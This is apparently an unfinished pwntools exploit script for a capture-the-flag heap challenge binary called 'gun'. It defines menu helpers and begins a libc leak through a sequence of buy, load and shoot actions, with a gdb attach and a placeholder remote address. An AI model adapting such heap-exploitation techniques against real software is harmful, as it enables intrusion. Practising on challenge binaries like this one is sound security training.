#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'gun'
#libc_path = './libc.so.6'

# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC  = 0

#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def shoot(t):
	sla('>', '1')
	sla(':', str(t))

def load(n):
	sla('>', '2')
	sla('?', str(n))

def buy(n, d):
	sla('>', '3')
	sla(':', str(n))
	sa(':', d)

def quit():
	sla('>', '4')
	
	

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	# leak libc
	sla(':', 'I0gan')

	buy(0x10, 'E' * 8 + '\n') # 0
	buy(0x10, 'F' * 8 + '\n') # 1
	load(1)
	load(0)
	shoot(2)

	buy(0x10, 'G' * 8 + '\n') # 1
	load(0)
	db()
	shoot(2)
	

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_PRELOAD" : libc_path} )
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
